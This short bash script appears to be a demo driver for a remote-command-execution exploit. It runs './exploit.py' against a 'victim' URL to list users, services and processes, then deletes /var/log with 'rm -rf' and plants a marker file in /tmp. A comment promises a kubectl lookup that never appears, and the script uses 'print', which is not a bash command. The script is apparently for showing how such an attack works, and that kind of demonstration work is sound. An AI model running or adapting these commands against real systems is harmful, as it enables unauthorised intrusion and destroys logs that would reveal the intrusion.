#!/bin/bash
# Bash Menu Script Example

# Fetch victim URL using kubectl

echo "URL: $URL"
print "URL: $URL - Attacks Running"
echo "💬${green}☠☠☠☠☠☠ RUNNING EVERYTHING ☠☠☠☠☠☠☠"
echo "💬${green}Showing what users is running the application..."
python ./exploit.py "http://$URL" "whoami"
echo "💬${green}Showing running services and processes..."
python ./exploit.py "http://$URL" "service  --status-all && ps -aux"
echo "💬${green}Showing current log files..."
python ./exploit.py "http://$URL" "ls -lah /var/log"
echo "💬${green}Deleting the log folder..."
python ./exploit.py "http://$URL" "rm -rf /var/log"
echo "💬${green}Showing the log folder was deleted..."
python ./exploit.py "http://$URL" "ls -lah /var/log"
echo "💬${green}Showing current files..."
python ./exploit.py "http://$URL" "ls -lah /tmp"
echo "💬${green}Create a new file..."
python ./exploit.py "http://$URL" "touch /tmp/TREND_HAS_BEEN_HERE"
echo "💬${green}Showing files again..."
python ./exploit.py "http://$URL" "ls -lah /tmp"
